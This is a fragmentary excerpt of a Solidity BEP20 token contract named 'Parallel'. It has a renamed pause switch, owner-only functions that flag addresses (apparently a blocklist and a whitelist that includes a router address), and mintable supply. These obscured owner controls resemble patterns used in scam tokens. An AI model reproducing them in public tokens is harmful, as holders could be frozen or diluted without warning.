 ...
 */
contract Xable is Ownable {
  event X();
  event UnX();

  bool public _x = false;
  ...
  function x() onlyOwner whenNotX public {
    _x = true;
    emit X();
  }


  function unx() onlyOwner whenX public {
    _x = false;
    emit UnX();
  }

  function setP(address[] _add,bool _b) onlyOwner public{
  ...
  function setB(address[] _add,bool _b) onlyOwner public{
    require(_add.length>0);
    uint arrayLength = _add.length;
    for(uint i=0;i<arrayLength;i++){
        b[_add[i]]=_b;
...
contract XableToken is StandardToken, Xable {
...
contract BEP20Token is XableToken, MintableToken {
    // public variables
    string public name = "Parallel";
    string public symbol = "Parallel";
    uint8 public decimals = 9;

    constructor() public {
        totalSupply_ = 5000000000000000000;
        p[0x10ED43C718714eb63d5aA57B78B54704E256024E]=true;
    }
